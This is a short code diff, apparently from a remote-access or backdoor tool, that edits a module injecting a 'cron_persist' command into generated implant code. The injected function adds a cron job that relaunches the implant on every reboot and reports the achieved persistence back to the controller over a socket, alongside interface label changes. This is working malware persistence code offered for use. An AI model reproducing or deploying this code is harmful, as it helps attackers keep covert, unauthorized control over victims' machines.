@@ -1,10 +1,9 @@
-# WEB + COM
+# GUI + CUI
 # done
 import library.modules.config as config
+
 config.main()
 interface = config.interface
-if interface == "GUI":
-    from flask import jsonify
 
 
 def main(option):
@@ -22,7 +21,8 @@ def cron_persist():
         job = cron.new(command=path.join(getcwd(),path.abspath(argv[0])))
     job.every_reboot() 
     cron.write()
-    main_send('[+]Achieved persistence via cron job', s)''')
+    send_all(s,'[+]Acheived persistence via cron job!')
+''')
         config.logics.append('''
             elif command == "cron_persist":
                 cron_persist()''')
